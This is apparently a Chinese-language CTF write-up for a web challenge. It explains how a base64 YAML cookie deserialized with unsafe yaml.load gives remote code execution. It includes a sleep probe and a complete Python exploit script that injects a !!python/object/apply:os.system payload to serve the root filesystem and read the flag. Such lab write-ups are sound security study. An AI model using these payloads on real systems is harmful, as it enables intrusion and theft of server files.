## 题解

### 入口与指纹

同样的 SiteSaver：`/` → `/list`，`/add`（`name` + `url`），首次访问下发 `user` + `bookmarks` cookie。

### 关键观察

**1. 这里的 `bookmarks` 不是 pickle，而是 YAML。**

```text
空列表：  W10K                          -> "[]\n"
添加一条：LSAhIXB5dGhvbi9vYmplY3Q6...  -> "- !!python/object:app.models.UrlObj\n  name: n\n  url: http://example.com\n"
```

`!!python/object:app.models.UrlObj` 说明服务端用 **`yaml.dump`（Python 标签）** 序列化，
反序列化很可能用了 `yaml.load(..., Loader=yaml.Loader)`（不安全）。

**2. 用 `sleep` 验证：**

```text
bookmarks = base64("!!python/object/apply:os.system ['sleep 3']\n")
→ /list 用时 3.14s（对照 0.13s），然后 500
```

**3. 与 057 的差别：** 057 是 pickle（`gARdlC4=`）；这个是 YAML（`W10K`）。判据是
base64 解出来以 `\x80\x04` 还是 `- ` / `[]` 开头。

### 利用链

```bash
T=$(head -1 .target)
python3 - "$T" <<'PY'
import base64, sys, time, requests
T=f"http://{sys.argv[1]}"
s=requests.Session(); s.trust_env=False
s.get(T+"/list"); user=s.cookies.get("user")
yml=b"!!python/object/apply:os.system ['setsid python3 -m http.server 8899 --directory / >/dev/null 2>&1 &']\n"
requests.get(T+"/list", cookies={"user":user,"bookmarks":base64.b64encode(yml).decode()}, timeout=15)
time.sleep(2)
print(requests.get(f"http://{sys.argv[1]}:8899/flag.txt").text)
PY
```

### flag 位置

容器内 `/flag.txt`（`/FLAG.txt` 不存在），经自建 8899 静态服务读出。

## 复盘

- **cookie 里的 base64 一定要先解出来看。** 同一个站点、同一个 cookie 名，
  057 是 pickle、075 是 YAML，利用 payload 完全不同（`__reduce__` vs `!!python/object/apply`）。
- `yaml.dump` 输出带 `!!python/object:` 时，服务端多半用的是不安全的 `yaml.load`；
  直接试 `!!python/object/apply:os.system`。
- 仍然需要 `user` cookie 才触发（同 057）。
